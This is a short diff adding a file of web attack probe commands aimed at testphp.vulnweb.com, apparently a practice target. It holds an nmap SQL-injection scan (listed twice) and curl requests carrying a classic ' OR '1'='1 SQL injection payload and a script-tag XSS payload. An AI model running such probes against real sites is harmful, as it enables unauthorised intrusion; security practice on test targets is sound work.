@@ -1,0 +1,8 @@
+nmap --script http-sql-injection -p 80 testphp.vulnweb.com
+
+
+curl -kv "http://testphp.vulnweb.com/listproducts.php?cat=1%27%20OR%20%271%27%3D%271"
+curl -kv "http://testphp.vulnweb.com/?q=<script>alert('XSS')</script>"
+nmap --script http-sql-injection -p 80 testphp.vulnweb.com
+
+
